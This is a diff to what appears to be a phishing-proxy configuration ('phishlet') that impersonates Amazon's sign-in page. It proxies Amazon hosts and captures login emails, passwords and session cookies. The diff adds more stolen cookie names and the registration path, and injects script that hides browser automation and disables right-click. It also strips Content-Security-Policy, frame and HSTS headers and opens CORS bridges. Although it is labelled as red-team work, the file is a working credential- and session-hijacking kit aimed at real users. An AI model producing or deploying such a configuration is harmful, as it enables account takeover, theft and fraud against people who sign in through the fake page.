@@ -1,26 +1,46 @@
 name: "Amazon-Login"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "amazon"
     target: "www.amazon.com"
-auth_urls: ["/ap/signin"]
-landing_path: ["/ap/signin"]
+  - subdomain: "images"
+    target: "images-na.ssl-images-amazon.com"
+  - subdomain: "fls"
+    target: "fls-na.amazon.com"
+auth_urls: 
+  - "/ap/signin"
+  - "/ap/register"
+landing_path: 
+  - "/ap/signin"
 auth_tokens:
   - {type: "cookie", name: "x-main"}
   - {type: "cookie", name: "at-main"}
   - {type: "cookie", name: "sess-at-main"}
   - {type: "cookie", name: "ubid-main"}
+  - {type: "cookie", name: "session-id"}
+  - {type: "cookie", name: "session-id-time"}
+  - {type: "cookie", name: "i18n-prefs"}
 credentials:
   - {type: "post_param", name: "email", regex: null}
   - {type: "post_param", name: "password", regex: null}
   - {type: "post_param", name: "create_account_email", regex: null}
   - {type: "post_param", name: "create_account_password", regex: null}
-injections: []
+injections:
+  - trigger_path: "/ap/signin"
+    position: "body_end"
+    content: |
+      (function(){
+        // Amazon Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        // Disable right-click for security
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
   - {action: "remove", name: "X-Content-Type-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites:
   - {pattern: "^/$", replace: "/ap/signin", methods: ["GET"]}
 cookie_rewrites: []
@@ -28,3 +48,6 @@ blocklist:
   - {pattern: "images|/ads|/tagging|analytics|/js/external/", mimes: ["image/", "text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"signin\"]", action_to: "/ap/session"}
+bridges:
+  - {prefix: "/_images/", target_host: "images-na.ssl-images-amazon.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_fls/", target_host: "fls-na.amazon.com", strip_prefix: true, cors: "allow_all"}
